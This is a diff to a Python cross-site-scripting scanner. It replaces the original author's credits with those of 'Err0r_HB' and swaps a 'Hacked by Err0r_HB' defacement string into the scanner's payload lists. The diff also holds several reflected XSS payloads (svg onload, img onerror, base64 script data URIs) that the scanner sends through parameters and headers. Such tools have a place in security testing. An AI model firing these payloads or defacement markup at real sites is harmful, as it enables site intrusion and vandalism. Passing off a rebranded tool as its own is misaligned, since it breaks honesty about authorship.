@@ -11,13 +11,12 @@
 #
 #  You should have received a copy of the GNU General Public License
 #  along with this program; if not, write to the Free Software
-#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
-#  MA 02110-1301, USA.
-__author__ = 'Khaled Nassar'
+
+__author__ = 'Err0r_HB'
 __version__ = '0.3#beta'
-__github__ = 'https://github.com/knassar702/scant3r'
-__email__ = 'knassar702@gmail.com'
-__blog__ = 'https://knassar7o2.blogspot.com'
+__github__ = 'https://github.com/Err0r-ICA/SCANter'
+__email__ = 'error_hb@protonmail.com'
+__blog__ = 'https://t.me/termuxhacks'
 
 import requests,sys,os,re,random,urllib3
 from .encoder import urlencoder
@@ -107,8 +106,8 @@ class paramscanner: # Scanner Module
 			che = re.findall('ScanT3r'.encode('utf-8'),check.content)
 			if len(ch) < len(che):
 				logger.info('reflect is found')
-				payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
-				logger.info('Trying to get xss from the parameter')
+				payloads=['"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>Err0r_HB','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
+				logger.info('Trying to get XSS from the parameter')
 				for payload in payloads:
 					payload2=urlencoder(payload)
 					for i in range(deco):
@@ -140,7 +139,7 @@ class paramscanner: # Scanner Module
 			else:
 				pass
 		elif '*' not in url:
-			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
+			payloads=['"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
 			x = 0
 			for params in url.split("?")[1].split("&"):
 				if slp != 0:
@@ -194,7 +193,7 @@ class paramscanner: # Scanner Module
 		if ok:
 			logger.info('replacing (*) from url to payload')
 			x = 0
-			payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',"<img src=x onerror=alert(1)>","'><img src=x onerror=alert(1)>"]
+			payloads=['"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',"<img src=x onerror=alert(1)>","'><img src=x onerror=alert(1)>"]
 			if slp != 0:
 				logger.debug(f'Sleeping {slp} sec')
 			sleep(slp)
@@ -250,7 +249,7 @@ class paramscanner: # Scanner Module
 			else:
 				pass
 		else:
-			payloads=["'><img src=x onerror=alert(1)>",'">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
+			payloads=["'><img src=x onerror=alert(1)>",'"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">']
 			x = 0
 			if slp != 0:
 				logger.debug(f'Sleeping {slp} sec')
@@ -794,7 +793,7 @@ class headers_scanner: # Header Scanner Module ;-;
 		pass
 	def referrer_xss(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
 		deco = deco - 1
-		payloads=["<img src=x onerror=alert(1)>",'">ScanT3r<svg/onload=confirm(/ScanT3r/)>web',"'><img src=x onerror=alert(1)>"]
+		payloads=["<img src=x onerror=alert(1)>",'"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"',"'><img src=x onerror=alert(1)>"]
 		for payload in payloads:
 			if method == 'get':
 				sleep(slp)
@@ -989,7 +988,7 @@ class headers_scanner: # Header Scanner Module ;-;
 \033[91m#{yellow}{bold}--------------------------------{end}\033[91m#{end}""")
 					break
 	def user_agent_xss(url,timeo=None,cookie=None,redir=None,deco=None,vert=None,method=None,date=None,cagent=None,proxy=None,slp=0,batch=None):
-		payloads=['">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
+		payloads=['"<body><center><body bgcolor="Black"><center><h1><font color="Lime">Hacked <font color="Black">by <font color="Red">Err0r_HB</h1></center></body>"','"><img src="x" OnMouseEnter=(confirm)(1)>ScanT3r','"><div onpointermove="alert(45)">MOVE HERE</div>','"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">','<img src=x onerror=alert(1)>',"'><img src=x onerror=alert(1)>"]
 		for payload in payloads:
 			if method == 'get':
 				sleep(slp)
